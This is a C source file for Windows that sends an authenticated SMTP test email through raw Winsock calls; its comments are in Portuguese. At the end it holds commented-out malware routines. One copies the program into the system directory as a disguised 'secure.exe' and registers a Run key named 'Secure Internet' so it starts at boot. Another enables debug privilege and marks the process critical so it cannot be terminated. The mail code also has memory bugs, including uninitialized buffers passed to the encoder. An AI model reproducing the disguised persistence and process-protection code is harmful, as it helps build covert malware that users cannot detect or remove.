#include "para.h"
#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <time.h>
#include <base64.h>
#include <locale.h>

#pragma comment(lib, "Ws2_32.lib")

char * MailHeader(const char* from, const char* to, const char* subject, const char* mime_type, const char* charset);
SOCKET ConnectToServer(const char* server_address);

int main(){
    //ISO-8859-1
    char *header = MailHeader(FROM, TO, "Olá, esta é umm mensagem de teste.", "text/plain", "US-ASCII");
    SOCKET connected_fd = ConnectToServer(smtp_address);

    if(connected_fd != -1){
        int recvd = 0;
        char recv_buff[4768];
        int sdsd;
        
        sdsd = recv(connected_fd, recv_buff + recvd, sizeof(recv_buff) - recvd, 0);
        recvd += sdsd;
        
        char buff[1000];
        strcpy(buff, "EHLO ");
        strcat(buff, domain);
        strcat(buff, "\r\n");
        send(connected_fd, buff, strlen(buff), 0);
        sdsd = recv(connected_fd, recv_buff + recvd, sizeof(recv_buff) - recvd, 0);
        recvd += sdsd;
        printf("%i:\t%s", sdsd, buff);

        char _cmd2[1000];
        strcpy(_cmd2, "AUTH LOGIN\r\n");
        send(connected_fd, _cmd2, strlen(_cmd2), 0);
        sdsd = recv(connected_fd, recv_buff + recvd, sizeof(recv_buff) - recvd, 0);
        recvd += sdsd;
        printf("%i:\t%s", sdsd, _cmd2);
        
        char *_cmd3;
        b64_encodef(UID, _cmd3);
        strcat(_cmd3, "\r\n");
        send(connected_fd, _cmd3, strlen(_cmd3), 0);
        sdsd = recv(connected_fd, recv_buff + recvd, sizeof(recv_buff) - recvd, 0);
        recvd += sdsd;
        printf("%i:\t%s", sdsd, _cmd3);

        char *_cmd4;
        b64_encodef(PWD, _cmd4);
        strcat(_cmd4, "\r\n");
        send(connected_fd, _cmd4, strlen(_cmd4), 0);
        sdsd = recv(connected_fd, recv_buff + recvd, sizeof(recv_buff) - recvd, 0);
        recvd += sdsd;
        printf("%i:\t%s", sdsd, _cmd4);

        char _cmd5[1000];
        strcpy(_cmd5, "MAIL FROM: ");
        strcat(_cmd5, FROM);
        strcat(_cmd5, "\r\n");
        send(connected_fd, _cmd5, strlen(_cmd5), 0);
        char skip[1000];
        sdsd = recv(connected_fd, skip, sizeof(skip), 0);
        printf("%i:\t%s", sdsd, _cmd5);

        char _cmd6[1000];
        strcpy(_cmd6, "RCPT TO: ");
        strcat(_cmd6, TO);
        strcat(_cmd6, "\r\n");
        send(connected_fd, _cmd6, strlen(_cmd6), 0);
        sdsd = recv(connected_fd, recv_buff + recvd, sizeof(recv_buff) - recvd, 0);
        recvd += sdsd;
        printf("%i:\t%s", sdsd, _cmd6);

        char _cmd7[1000];
        strcpy(_cmd7, "DATA\r\n");
        send(connected_fd, _cmd7, strlen(_cmd7), 0);
        sdsd = recv(connected_fd, recv_buff + recvd, sizeof(recv_buff) - recvd, 0);
        recvd += sdsd;
        printf("%i:\t%s", sdsd, _cmd7);

        send(connected_fd, header, strlen(header), 0);
        char _cmd8[1000];
        strcpy(_cmd8, "Ola eu estou testando meu smtp");
        send(connected_fd, _cmd8, sizeof(_cmd8), 0);
        char _cmd9[1000];
        strcpy(_cmd9, "\r\n.\r\n.");
        send(connected_fd, _cmd9, sizeof(_cmd9), 0);
        sdsd = recv(connected_fd, recv_buff + recvd, sizeof(recv_buff) - recvd, 0);
        recvd += sdsd;
        printf("%i:\t%s %s", sdsd, _cmd8, _cmd9);

        char _cmd10[1000];
        strcpy(_cmd10, "QUIT\r\n");
        send(connected_fd, _cmd10, sizeof(_cmd10), 0);
        sdsd = recv(connected_fd, recv_buff + recvd, sizeof(recv_buff) - recvd, 0);
        recvd += sdsd;
        printf("%i:\t%s", sdsd, _cmd10);

        printf("0) %s\r\n", &recv_buff);
        free(header);
        closesocket(connected_fd);
    }
    
    return (EXIT_SUCCESS);
}

char *MailHeader(const char* from, const char* to, const char* subject, const char* mime_type, const char* charset){
    time_t now;
    time(&now);
    
    char *app_brand = "Application for Tests.";
    char* mail_header = NULL;

    // Criando vetores que conterão cada linha do cabeçalho
    char date_buff[26]; 
    char Branding[6 + strlen(date_buff) + 12 + strlen(app_brand) + 2]; // <-- Guardará DATA, HORA e o cabeçalho X-Mailer (aplicação que rascunhou e enviou o e-mail)
    char Sender[6 + strlen(from) + 2]; // <-- Remetente
    char Recip[4 + strlen(to) + 2]; // <-- Destinatário
    char Subject[9 + strlen(subject) + 2]; // <-- Assunto
    char mime_data[33 + strlen(mime_type) + 10 + strlen(charset) + 4]; // <-- Outros dados do cabeçalho

    // Preenchendo os vetores do header com os seus respectivos valores
    strftime(date_buff, (33), "%a , %d %b %Y %H:%M:%S", localtime(&now));
    sprintf(Branding, "DATE: %s\r\nX-Mailer: %s\r\n", date_buff, app_brand);
    sprintf(Sender, "FROM: %s\r\n", from);
    sprintf(Recip, "TO: %s\r\n", to);
    sprintf(Subject, "Subject: %s\r\n", subject);
    sprintf(mime_data, "MIME-Version: 1.0\r\nContent-Type: %s; charset=%s\r\n\r\n", mime_type, charset);

    // Pegando o tamanho de todos os vetores
    int mail_header_length = strlen(Branding) + strlen(Sender) + strlen(Recip) + strlen(Subject) + strlen(mime_data) + 10;

    // Criando um vetor dinamicamente que guardará todo o cabeçalho 
    mail_header = (char *) malloc(mail_header_length *sizeof(char));

    memcpy(&mail_header[0], &Branding, strlen(Branding));
    memcpy(&mail_header[0 + strlen(Branding)], &Sender, strlen(Sender));
    memcpy(&mail_header[0 + strlen(Branding) + strlen(Sender)], &Recip, strlen(Recip));
    memcpy(&mail_header[0 + strlen(Branding) + strlen(Sender) + strlen(Recip)], &Subject, strlen(Subject));
    memcpy(&mail_header[0 + strlen(Branding) + strlen(Sender) + strlen(Recip) + strlen(Subject)], &mime_data, strlen(mime_data));

    return mail_header;
}

SOCKET ConnectToServer(const char* server_address) {
    WSADATA wsaData;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(587); //465
    addr.sin_addr.s_addr = inet_addr(server_address);
    
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Falha ao iniciar o WSA.\n");
        return -1;
    }

    int socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (socket_fd == INVALID_SOCKET || socket_fd == SOCKET_ERROR) {        
        printf("Erro no socket: %i", WSAGetLastError());
        WSACleanup();
        return -1;
    }

    if(connect(socket_fd, (SOCKADDR *)&addr, sizeof(addr)) < 0){
        printf("Erro na conexao.\n");
        return -1;
    }
    
    return socket_fd;
}

// #define FAKE_NAME "\\secure.exe"
// #define FAKE_KEY "Secure Internet"

// void regApp () {
//     char system_ [MAX_PATH];
//     char pathToFile[MAX_PATH];
//     HMODULE getMod = GetModuleHandle (NULL);
    
//     GetModuleFileName (getMod, pathToFile, sizeof(pathToFile));
//     GetSystemDirectory (system_, sizeof( system_ ));
    
//     strcat (system_, FAKE_NAME);
    
//     CopyFile (pathToFile, system_, 0);
    
//     HKEY key_;
//     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key_);
//     RegSetValueEx(key_, FAKE_KEY, 0, REG_SZ, (const unsigned char *) system_, sizeof(system_));
//     RegCloseKey(key_);
// }
 
// int protectProcess() {
//     int enablePriv (const char * szPriv);
//     HANDLE DLL;
//     RtlSetProcessIsCritical setCritical;
 
//     DLL = LoadLibraryA ("ntdll.dll");
 
//     if(DLL == NULL)
// 		return -1;
 
// 	if (enablePriv(SE_DEBUG_NAME) < 0)
// 		return -1;
 
// 	setCritical = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE) DLL, "RtlSetProcessIsCritical");
// 	if (!setCritical)
// 		return -1;
// 	setCritical(1, 0, 0);

// 	return 0;
// }
 
// int enablePriv (const char * szPriv) {
//     HANDLE token;
//     LUID luid;
//     TOKEN_PRIVILEGES privs;
//     memset (&privs, 0, sizeof (privs));

//     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) 
//         return -1;


//     if (!LookupPrivilegeValue(NULL, szPriv, &luid)){
//         CloseHandle (token);
//         return -1;
//     }

//     privs.PrivilegeCount = 1;
//     privs.Privileges[0].Luid= luid;
//     privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

//     if (!AdjustTokenPrivileges (token, FALSE, &privs, sizeof (privs),NULL,NULL)) 
//         return -1;

//     CloseHandle (token);
//     return 0;
// }